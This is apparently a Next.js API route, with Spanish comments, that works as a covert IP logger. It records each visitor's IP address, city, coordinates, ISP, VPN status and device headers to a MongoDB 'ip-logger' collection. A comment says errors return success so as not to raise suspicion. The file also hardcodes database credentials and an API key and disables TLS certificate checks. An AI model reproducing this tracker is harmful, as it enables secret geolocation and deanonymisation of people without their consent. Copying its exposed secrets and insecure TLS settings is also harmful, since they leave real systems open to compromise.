import { NextApiRequest, NextApiResponse } from 'next';
import { MongoClient } from 'mongodb';
import axios from 'axios';

const uri = "mongodb+srv://edgarafedo123:5SirfCPTfHWXyCMq@serverlessinstance0.ntmdhhx.mongodb.net/?retryWrites=true&w=majority&appName=ServerlessInstance0";
const IPGEO_API_KEY = "d4600b4e8d3f42c39875e0fae7e92630"; // API key gratuita

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const client = new MongoClient(uri, {
    ssl: true,
    tls: true,
    tlsAllowInvalidCertificates: true
  });

  try {
    await client.connect();
    const database = client.db('ip-logger');
    const collection = database.collection('logs');
    
    const clientIP = req.headers['x-forwarded-for'] || 
                    req.socket.remoteAddress || 
                    'IP no detectada';

    // Usando ipgeolocation.io para datos más precisos
    const geoResponse = await axios.get(
      `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEO_API_KEY}&ip=${clientIP}`
    );

    const geoData = geoResponse.data;

    const logData = {
      ip: clientIP,
      timestamp: new Date(),
      location: {
        country: geoData.country_name,
        city: geoData.city,
        district: geoData.district,
        zipcode: geoData.zipcode,
        latitude: geoData.latitude,
        longitude: geoData.longitude,
        isp: geoData.isp,
        connection_type: geoData.connection_type,
        organization: geoData.organization,
        timezone: geoData.time_zone.name,
        currency: geoData.currency.code,
        security: {
          is_proxy: geoData.security?.is_proxy,
          is_vpn: geoData.security?.is_vpn,
          threat_score: geoData.security?.threat_score
        }
      },
      device: {
        userAgent: req.headers['user-agent'],
        language: req.headers['accept-language'],
        platform: req.headers['sec-ch-ua-platform'],
        mobile: req.headers['sec-ch-ua-mobile']
      }
    };

    await collection.insertOne(logData);

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(200).json({ success: true }); // Mantenemos 200 para no levantar sospechas
  } finally {
    await client.close();
  }
} 